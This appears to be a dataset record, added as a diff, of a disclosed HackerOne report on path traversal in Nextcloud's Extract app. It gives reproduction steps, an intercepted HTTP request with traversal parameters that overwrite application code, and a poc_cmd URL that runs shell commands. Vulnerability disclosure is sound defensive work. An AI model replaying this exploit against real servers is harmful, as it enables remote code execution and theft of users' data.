@@ -1,0 +1,50 @@
+{
+  "reported_to": "Nextcloud",
+  "reported_by": "emilvirkki ",
+  "title": "Remote code execution via path traversal in Zip extraction in the Extract app",
+  "content": "\nI realise this doesn't qualify for a reward, as it's a vulnerability in a third-party app, but as the app is part of the \"official\" VM image provided by Hansson IT, I think it's well worth fixing.\nThe Extract app doesn't validate the path or filename of a zip file to be extracted, allowing an attacker to create or overwrite arbitrary files.\nHow to reproduce\nInstall NextCloud using the VM image with default settings (with the extra security options).\nCreate a new user with no user group and log in as that user.\nUpload the payload zip file (nextcloud-shell.zip, attached) to the root folder (or wherever you like). It contains a modified version of apps/files/App.php, necessary for getting the payload to run.\nClick the \"Extract here\" option for the nextcloud-shell.zip and intercept the request. Modify the request body so the request looks something like the following. You need to replace \"normaluser\" with the username of the user you created in (2):\nCode 1.07 KiB\n1POST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1\n2Host: 192.168.100.32\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0\n4Accept: */*\n5Accept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3\n6Accept-Encoding: gzip, deflate, br\n7Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n8requesttoken: lv0G5+K7v/a3w30wOMyR35SvBgF35GHmiuoejP+8u7g=:w5s+qIPUj8aAohdpWojkiazdVXYRkwyp47t8ypHy/+4=\n9OCS-APIREQUEST: true\n10X-Requested-With: XMLHttpRequest\n11Content-Length: 55\n12Origin: https://192.168.100.32\n13DNT: 1\n14Connection: close\n15Cookie: ocmmdvtkydkx=1u2e2imt5h7g0pimv84eoqnfco; oc_sessionPassphrase=MXmMNXhcE3%2FpbZla9mKTYIS18lYG49cMP8lTHFrJfGe1jLxHd2hHfg8vYs1O6hFjv2IbkI31jhMeJnajKWNYzIb7G3f9UNiFmyKJwAbzPWLKY594ScipzPr6u%2BN9SUp3; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; nc_username=normaluser; nc_token=FkBWj5z2dOJS0v4putAyW2oL7tAEOc9Q; nc_session_id=1u2e2imt5h7g0pimv84eoqnfco\n16\n17nameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip&directory=/../../../../var/www/nextcloud/apps/files/lib&external=0\nOpen the following URL (replace host ip with your actual install) and observe how the current user and group are printed: https://192.168.100.32/apps/files/?dir=/&poc_cmd=whoami. You can obviously change the poc_cmd parameter to run any command you like.\nImpact\nThe attacker can run any commands with the privileges of the www-data user. This allows the attacker to access and modify all the files and personally identifiable information in the installation.\n\n",
+  "severity": [
+    8.8,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1583603640,
+  "report_url": "https://hackerone.com/reports/765291",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Install NextCloud using the VM image with default settings (with the extra security options)."
+    ],
+    [
+      2,
+      "Create a new user with no user group and log in as that user."
+    ],
+    [
+      3,
+      "Upload the payload zip file (nextcloud-shell.zip, attached) to the root folder (or wherever you like). It contains a modified version of apps/files/App.php, necessary for getting the payload to run."
+    ],
+    [
+      4,
+      "Click the 'Extract here' option for the nextcloud-shell.zip and intercept the request. Modify the request body to include path traversal in the directory parameter."
+    ],
+    [
+      5,
+      "Open the URL with the poc_cmd parameter to execute arbitrary commands."
+    ]
+  ],
+  "vuln_description": "The Extract app in NextCloud doesn't validate the path or filename during zip extraction, allowing an attacker to create or overwrite arbitrary files via path traversal. This can lead to remote code execution as the www-data user.",
+  "reason": "The attack involves understanding path traversal in zip extraction, intercepting and modifying HTTP requests, and crafting a malicious zip file. While these components are known techniques, combining them requires some knowledge of the application's file handling and extraction process.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
